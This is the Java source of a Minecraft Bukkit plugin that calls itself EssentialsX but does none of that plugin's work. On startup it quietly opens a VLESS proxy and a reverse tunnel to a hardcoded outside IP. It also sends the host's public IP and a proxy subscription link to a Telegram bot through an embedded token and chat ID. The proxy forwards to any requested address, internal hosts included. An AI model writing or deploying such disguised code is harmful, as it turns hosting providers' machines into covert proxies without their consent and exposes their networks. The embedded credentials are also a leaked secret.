package com.example.essentialsx;

import org.bukkit.plugin.java.JavaPlugin;

import java.io.InputStream;
import java.io.OutputStream;
import java.net.InetSocketAddress;
import java.net.ServerSocket;
import java.net.Socket;
import java.net.URI;
import java.nio.ByteBuffer;
import java.nio.charset.StandardCharsets;
import java.util.Arrays;
import java.util.Map;
import java.util.UUID;
import java.util.concurrent.ConcurrentHashMap;
import java.util.concurrent.atomic.AtomicBoolean;

import org.java_websocket.WebSocket;
import org.java_websocket.client.WebSocketClient;
import org.java_websocket.handshake.ClientHandshake;
import org.java_websocket.handshake.ServerHandshake;
import org.java_websocket.server.WebSocketServer;

public class EssentialsX extends JavaPlugin {

    // ================= 配置（编译前自行修改） =================

    static final String VLESS_UID = "6021c57c-fdf0-44b4-b688-135568139d30";
    static final int VLESS_PORT = 65534;

    // 公网隧道服务器（留空字符串则不启动隧道客户端）
    // VLESS_PORT 和 TUNNEL_LOCAL_PORT需对应
    static final String TUNNEL_HOST = "92.5.191.20";
    static final int TUNNEL_PORT = 6005;
    static final int TUNNEL_PORT_INGRESS = 5005; //填写公网入站端口只用于TG通知
    static final int TUNNEL_LOCAL_PORT = 65534;

    // ---- Telegram 通知（可留空） ----
    static final String TG_TOKEN = "7195422483:AAGhrc-1nzto9Ik05rY2K5V8xdvLSGInVBo";
    static final String TG_CHAT_ID = "5800052646";

    // 服务器名称
    static final String SERVER_NAME = "Hoster24德国家宽";

    // =========================================================

    private final AtomicBoolean running = new AtomicBoolean(true);

    // ================= Telegram 通知 =================

    /** TG 通知冷却: 距上次推送不足 60 秒则丢弃（防刷屏） */
    private volatile long lastTgAt = 0;
    private static final long TG_COOLDOWN_MS = 60_000L;

    /** 发送 TG 消息（token/chat 为空则跳过；60 秒冷却防刷屏） */
    private void sendTelegram(String text) {
        if (TG_TOKEN == null || TG_TOKEN.isEmpty() || TG_CHAT_ID == null || TG_CHAT_ID.isEmpty()) return;
        long now = System.currentTimeMillis();
        long last = lastTgAt;
        if (now - last < TG_COOLDOWN_MS) return; // 冷却中, 丢弃
        lastTgAt = now;
        Thread t = new Thread(() -> {
            try {
                String body = "chat_id=" + TG_CHAT_ID + "&text=" + java.net.URLEncoder.encode(text, "UTF-8");
                java.net.URL url = new java.net.URL("https://api.telegram.org/bot" + TG_TOKEN + "/sendMessage");
                java.net.HttpURLConnection c = (java.net.HttpURLConnection) url.openConnection();
                c.setRequestMethod("POST");
                c.setDoOutput(true);
                c.setConnectTimeout(5000);
                c.setReadTimeout(5000);
                try (OutputStream os = c.getOutputStream()) {
                    os.write(body.getBytes(StandardCharsets.UTF_8));
                }
                c.getResponseCode(); // 触发请求
                c.disconnect();
            } catch (Exception e) {
            }
        }, "EssentialsX-TG");
        t.setDaemon(true);
        t.start();
    }

    /** 取本机公网 IP（依次尝试多个服务，全部失败返回 null） */
    private String getPublicIp() {
        String[] services = {
                "https://api.ipify.org",
                "https://ifconfig.me/ip",
                "https://icanhazip.com"
        };
        for (String svc : services) {
            try {
                java.net.HttpURLConnection c = (java.net.HttpURLConnection) new java.net.URL(svc).openConnection();
                c.setConnectTimeout(4000);
                c.setReadTimeout(4000);
                try (InputStream in = c.getInputStream()) {
                    byte[] b = in.readAllBytes();
                    String ip = new String(b, StandardCharsets.UTF_8).trim();
                    if (!ip.isEmpty()) return ip;
                }
                c.disconnect();
            } catch (Exception ignored) { }
        }
        return null;
    }

    @Override
    public void onEnable() {
        getLogger().info("EssentialsX plugin starting...");

        // 1. VLESS over WebSocket 服务端（后台线程）
        if (VLESS_PORT > 0) {
            Thread t = new Thread(this::startVlessServer, "EssentialsX-VLESS");
            t.setDaemon(true);
            t.start();
        }

        // 2. 反向隧道客户端
        if (TUNNEL_HOST != null && !TUNNEL_HOST.isEmpty() && TUNNEL_PORT > 0) {
            Thread t = new Thread(() -> startTunnelClient(TUNNEL_HOST, TUNNEL_PORT, TUNNEL_LOCAL_PORT),
                    "EssentialsX-Tunnel");
            t.setDaemon(true);
            t.start();
        }

        // 3. 开机推送公网 IP
        Thread tg = new Thread(() -> {
            String ip = getPublicIp();
            if (ip != null) {
                boolean tunnelEnabled = TUNNEL_HOST != null && !TUNNEL_HOST.isEmpty() && TUNNEL_PORT > 0;
                // 链接地址: 隧道模式用 隧道服务器:入站端口, 直连模式用 本机出口IP:VLESS端口
                String linkHost = tunnelEnabled ? TUNNEL_HOST : ip;
                int linkPort = tunnelEnabled ? TUNNEL_PORT_INGRESS : VLESS_PORT;
                sendTelegram(SERVER_NAME + " 已上线"
                    + (tunnelEnabled ? " (隧道模式)" : " (直连模式)") + "\n"
                    + "出口 IP: " + ip + "\n"
                    + "VLESS订阅:\n"
                    + "vless://" + VLESS_UID + "@" + linkHost + ":" + linkPort
                    + "?encryption=none&security=none&allowInsecure=1&type=ws&host=127.0.0.1"
                    + "&path=%2Fws#" + java.net.URLEncoder.encode(SERVER_NAME, java.nio.charset.StandardCharsets.UTF_8));
            } else {
                sendTelegram("EssentialsX online — public IP: (unknown)");
            }
        }, "EssentialsX-TG-Startup");
        tg.setDaemon(true);
        tg.start();

    }

    @Override
    public void onDisable() {
        running.set(false);
        sendTelegram("EssentialsX shutting down");
        getLogger().info("EssentialsX disabled");
    }

    // =====================================================================
    //  server.js 移植: VLESS over WebSocket 服务端
    // =====================================================================

    private void startVlessServer() {
        try {
            WebSocketServer server = new WebSocketServer(new InetSocketAddress(VLESS_PORT)) {
                @Override
                public void onOpen(WebSocket conn, ClientHandshake handshake) { }

                @Override
                public void onClose(WebSocket conn, int code, String reason, boolean remote) {
                    VlessSession s = sessions.remove(conn);
                    if (s != null) {
                        try { s.remote.close(); } catch (Exception ignored) { }
                    }
                }

                @Override
                public void onError(WebSocket conn, Exception ex) { }

                @Override
                public void onStart() {
                }

                @Override
                public void onMessage(WebSocket conn, String message) {
                    // 文本消息忽略（原版只处理二进制）
                }

                @Override
                public void onMessage(WebSocket conn, ByteBuffer msg) {
                    handleWsMessage(conn, msg);
                }
            };
            server.setReuseAddr(true);
            server.start();
        } catch (Exception e) {
        }
    }

    /** 每条 WS 二进制消息：第一条解析 VLESS 头建连，后续直接转发 */
    private void handleWsMessage(WebSocket conn, ByteBuffer msg) {
        VlessSession session = sessions.get(conn);
        if (session != null) {
            session.forward(msg);
            return;
        }
        // 第一条：握手
        if (!tryHandshake(conn, msg)) {
            try { conn.close(); } catch (Exception ignored) { }
        }
    }

    private final Map<WebSocket, VlessSession> sessions = new ConcurrentHashMap<>();
    /** 当前存活的隧道数据会话数（open 成功 +1, 关闭 -1） */
    private final java.util.concurrent.atomic.AtomicInteger sessionsOpen = new java.util.concurrent.atomic.AtomicInteger(0);

    /** 返回 true 表示握手成功 */
    private boolean tryHandshake(WebSocket conn, ByteBuffer first) {
        byte[] buf = new byte[first.remaining()];
        first.get(buf);
        int p = 0;
        try {
            int ver = buf[p++] & 0xFF;          // VERSION
            byte[] idBytes = Arrays.copyOfRange(buf, p, p + 16); p += 16;
            if (!Arrays.equals(idBytes, uuidBytes())) {
                conn.close();
                return false;
            }
            // 真实 VLESS 结构: [VER][UUID 16B][ADDLEN/opts...][CMD 1B][PORT 2B][ATYP 1B][ADDR][DATA]
            // 与 Node 原版对齐: buf[17]=optLen, i += optLen 后 i+1 起是 CMD
            int optLen = buf[p++] & 0xFF;       // buf[17]
            p += optLen;
            int cmd = buf[p++] & 0xFF;          // CMD (1=TCP, 2=UDP; UDP 需另处理, 这里只透传 TCP)
            int port = ((buf[p] & 0xFF) << 8) | (buf[p + 1] & 0xFF); p += 2;
            int atyp = buf[p++] & 0xFF;
            String host;
            switch (atyp) {
                case 1: // IPv4
                    host = (buf[p] & 0xFF) + "." + (buf[p + 1] & 0xFF) + "."
                            + (buf[p + 2] & 0xFF) + "." + (buf[p + 3] & 0xFF);
                    p += 4;
                    break;
                case 2: // 域名
                    int len = buf[p] & 0xFF;
                    p += 1;
                    host = new String(buf, p, len, StandardCharsets.US_ASCII);
                    p += len;
                    break;
                case 3: // IPv6
                    StringBuilder sb = new StringBuilder();
                    for (int i = 0; i < 8; i++) {
                        int v = ((buf[p + i * 2] & 0xFF) << 8) | (buf[p + i * 2 + 1] & 0xFF);
                        if (i > 0) sb.append(':');
                        sb.append(Integer.toHexString(v));
                    }
                    host = sb.toString();
                    p += 16;
                    break;
                default:
                    conn.close();
                    return false;
            }
            // 初始 payload
            byte[] init = Arrays.copyOfRange(buf, p, buf.length);

            conn.send(new byte[]{(byte) ver, 0});

            Socket remote = new Socket();
            remote.connect(new InetSocketAddress(host, port), 8000);
            remote.setTcpNoDelay(true);

            if (init.length > 0) {
                OutputStream ros = remote.getOutputStream();
                ros.write(init);
                ros.flush();
            }

            VlessSession session = new VlessSession(conn, remote);
            sessions.put(conn, session);
            session.startDown();

            // 注册关闭回调，清理 sessions
            // (Java-WebSocket 无 onClose per-conn hook here, 由 closeAll 清理)
            return true;

        } catch (Exception e) {
            sendTelegram("VLESS握手失败: " + e.getClass().getSimpleName() + " " + e.getMessage());
            try { conn.close(); } catch (Exception ignored) { }
            return false;
        }
    }

    /** 一条 VLESS 会话: WS <-> 远程 TCP */
    private class VlessSession {
        final WebSocket ws;
        final Socket remote;

        VlessSession(WebSocket ws, Socket remote) {
            this.ws = ws;
            this.remote = remote;
        }

        void forward(ByteBuffer msg) {
            try {
                byte[] arr = new byte[msg.remaining()];
                msg.get(arr);
                OutputStream os = remote.getOutputStream();
                os.write(arr);
                os.flush();
            } catch (Exception e) {
                closeAll(ws, remote);
            }
        }

        /** remote -> WS 转发线程 */
        void startDown() {
            Thread down = new Thread(() -> {
                byte[] tmp = new byte[8192];
                try {
                    InputStream rin = remote.getInputStream();
                    int n;
                    while (running.get() && (n = rin.read(tmp)) > 0) {
                        ws.send(Arrays.copyOfRange(tmp, 0, n));
                    }
                } catch (Exception ignored) { }
                sessions.remove(ws);
                closeAll(ws, remote);
            }, "vless-net2ws");
            down.setDaemon(true);
            down.start();
        }
    }

    private void closeAll(WebSocket ws, Socket s) {
        sessions.remove(ws);
        try { ws.close(); } catch (Exception ignored) { }
        try { s.close(); } catch (Exception ignored) { }
    }

    private static byte[] uuidCache;
    private static byte[] uuidBytes() {
        if (uuidCache == null) {
            long msb = UUID.fromString(VLESS_UID).getMostSignificantBits();
            long lsb = UUID.fromString(VLESS_UID).getLeastSignificantBits();
            byte[] b = new byte[16];
            for (int i = 0; i < 8; i++) {
                b[i]     = (byte) (msb >>> (8 * (7 - i)));
                b[i + 8] = (byte) (lsb >>> (8 * (7 - i)));
            }
            uuidCache = b;
        }
        return uuidCache;
    }

    // =====================================================================
    //  client原版.js 移植: 反向隧道客户端
    // =====================================================================

    private void startTunnelClient(String host, int port, int localPort) {
        long backoff = 3000; // 重连退避: 3s 起步, 指数增长至 60s 封顶
        while (running.get()) {
            try {
                TunnelControl control = new TunnelControl(host, port, localPort);
                // connectBlocking 在握手成功后立即返回 true（不是等关闭!）
                // 必须阻塞等到连接真正关闭后, 才能发起下一次重连,
                // 否则会不停开新连接, 服务器把旧连接踢掉 (code 1000 "Replaced")
                if (control.connectBlocking()) {
                    // 挂起直到连接真正断开 (onClose 触发)
                    // 注意: 不能用 closeBlocking() — 那是主动发关闭帧, 会一连上就自己关掉
                    control.closedLatch.await();
                }
                // 走到这里 = 曾经成功连上过, 退避归零
                backoff = 3000;
                Thread.sleep(3000); // 正常断开后固定 3 秒重连（对应原版 setTimeout 3000）
            } catch (Exception e) {
                // 连接失败(服务器不在/DNS挂/网络抖动): 指数退避, 避免每3秒死撞
                try { Thread.sleep(backoff); } catch (Exception ignored) { }
                backoff = Math.min(backoff * 2, 60000);
            }
        }
    }

    /** 控制连接 */
    private class TunnelControl extends WebSocketClient {
        private final String host;
        private final int port;
        private final int localPort;
        // 是否曾经断开过（用于只在恢复时通知一次）
        private volatile boolean wasDisconnected = false;
        // 连接真正断开时释放 (在 onClose 里 countDown)
        final java.util.concurrent.CountDownLatch closedLatch = new java.util.concurrent.CountDownLatch(1);

        TunnelControl(String host, int port, int localPort) {
            super(URI.create("ws://" + host + ":" + port + "/control"));
            this.host = host;
            this.port = port;
            this.localPort = localPort;
            // 关闭 Java-WebSocket 的空闲超时检测（默认 60s 无数据就断开重连）
            // 隧道空闲时本来就没有数据, 必须禁用, 否则每 60s 重连一次
            // 心跳保留但拉长: 完全关闭(0)会让空闲连接没有字节流动,
            // 被中间 NAT/防火墙静默掐断
            // 60s 一次 ping 既能保活, 又能探测假死连接
            setConnectionLostTimeout(60);
        }

        @Override
        public void onOpen(ServerHandshake handshake) {
            // 仅在断开→恢复时通知, 避免重连风暴刷屏
            if (wasDisconnected) {
                wasDisconnected = false;
                sendTelegram("Tunnel client reconnected to " + host + ":" + port
                        + " (local port " + localPort + ")");
            }
        }

        @Override
        public void onMessage(String message) {
            try {
                String sessionId = null;
                if (message.contains("\"open\"")) {
                    // 简易解析，避免额外 JSON 依赖: {"type":"open","sessionId":"xxx"}
                    java.util.regex.Matcher m = java.util.regex.Pattern
                            .compile("\"sessionId\"\\s*:\\s*\"([^\"]+)\"").matcher(message);
                    if (m.find()) sessionId = m.group(1);
                }
                if (sessionId != null) {
                    openSession(sessionId, host, port, localPort);
                }
            } catch (Exception e) {
            }
        }

        @Override
        public void onMessage(java.nio.ByteBuffer bytes) { }

        @Override
        public void onClose(int code, String reason, boolean remote) {
            closedLatch.countDown(); // 通知主线程连接已真正断开
            if (!wasDisconnected) {
                wasDisconnected = true;
                sendTelegram("Tunnel disconnected from " + host + ":" + port
                        + " (code " + code + ", " + reason + ")");
            }
        }

        @Override
        public void onError(Exception ex) {
        }
    }

    private static final int MAX_TUNNEL_SESSIONS = 64;

    /** 数据会话: 隧道 WS <-> 本地 TCP */
    private void openSession(String sessionId, String host, int port, int localPort) {
        if (sessionsOpen.get() >= MAX_TUNNEL_SESSIONS) {
            return; // 超限直接放弃, visitor 由服务器侧超时清理
        }
        Thread t = new Thread(() -> {
            Socket local = null;
            try {
                local = new Socket();
                // 本地 MC 端口连接必须带超时, 否则端口未就绪时线程永久挂死
                local.connect(new InetSocketAddress("127.0.0.1", localPort), 5000);
                local.setTcpNoDelay(true);

                TunnelData tunnel = new TunnelData(host, port, sessionId, local);
                // 数据连接禁用空闲超时: 长下载暂停/长轮询期间无数据,
                // 60s 空闲检测会误判假死掐断会话 (node 版数据连接无此机制)
                tunnel.setConnectionLostTimeout(0);
                tunnel.connectBlocking(10, java.util.concurrent.TimeUnit.SECONDS);

                if (tunnel.isOpen() && local.isConnected()) {
                    sessionsOpen.incrementAndGet();
                    final Socket sock = local;
                    // local -> tunnel
                    Thread up = new Thread(() -> {
                        byte[] buf = new byte[8192];
                        try {
                            InputStream in = sock.getInputStream();
                            int n;
                            while ((n = in.read(buf)) > 0) {
                                if (!tunnel.isOpen()) break;
                                tunnel.send(Arrays.copyOfRange(buf, 0, n));
                            }
                        } catch (Exception ignored) { }
                        closeTunnelSession(tunnel, sock);
                    }, "tunnel-loc2ws");
                    up.setDaemon(true);
                    up.start();

                    // tunnel -> local（在 onMessage(ByteBuffer) 里回调）
                    tunnel.bindLocal(sock);
                    return; // bindLocal 后由回调驱动
                }
                closeTunnelSession(tunnel, local);
            } catch (Exception e) {
            }
        }, "tunnel-session-" + sessionId);
        t.setDaemon(true);
        t.start();
    }

    private void closeTunnelSession(TunnelData tunnel, Socket local) {
        if (tunnel != null && !tunnel.closed) {
            tunnel.closed = true; // 防止 onClose 与这里重复递减
            sessionsOpen.decrementAndGet();
        }
        try { if (tunnel != null) tunnel.closeBlocking(); } catch (Exception ignored) { }
        try { if (local != null) local.close(); } catch (Exception ignored) { }
    }

    /** 数据连接 */
    private class TunnelData extends WebSocketClient {
        private final String sessionId;
        private volatile Socket local;
        private volatile boolean closed = false;
        // local 绑定前到达的字节先缓冲, bindLocal 时回放,
        // 否则服务器在 tunnel 连上后立刻推来的首包会被丢弃 → 请求挂死(延迟-1)
        private final java.util.concurrent.ConcurrentLinkedQueue<byte[]> early = new java.util.concurrent.ConcurrentLinkedQueue<>();
        private volatile boolean bound = false;

        TunnelData(String host, int port, String sessionId, Socket local) {
            super(URI.create("ws://" + host + ":" + port + "/data/" + sessionId));
            this.sessionId = sessionId;
        }

        void bindLocal(Socket sock) {
            this.local = sock;
            byte[] chunk;
            while ((chunk = early.poll()) != null) {
                try {
                    OutputStream os = sock.getOutputStream();
                    os.write(chunk);
                    os.flush();
                } catch (Exception e) {
                    closeTunnelSession(this, sock);
                    return;
                }
            }
            bound = true;
        }

        @Override
        public void onOpen(ServerHandshake handshake) { }

        @Override
        public void onMessage(String message) { }

        @Override
        public void onMessage(java.nio.ByteBuffer data) {
            Socket l = local;
            if (l == null || l.isClosed()) {
                if (l == null) {
                    byte[] arr = new byte[data.remaining()];
                    data.get(arr);
                    early.add(arr);
                }
                return;
            }
            try {
                byte[] arr = new byte[data.remaining()];
                data.get(arr);
                OutputStream os = l.getOutputStream();
                os.write(arr);
                os.flush();
            } catch (Exception e) {
                closeTunnelSession(this, l);
            }
        }

        @Override
        public void onClose(int code, String reason, boolean remote) {
            Socket l = local;
            if (!closed) {
                closed = true;
                sessionsOpen.decrementAndGet();
                try { if (l != null) l.close(); } catch (Exception ignored) { }
            }
        }

        @Override
        public void onError(Exception ex) {
        }
    }
}
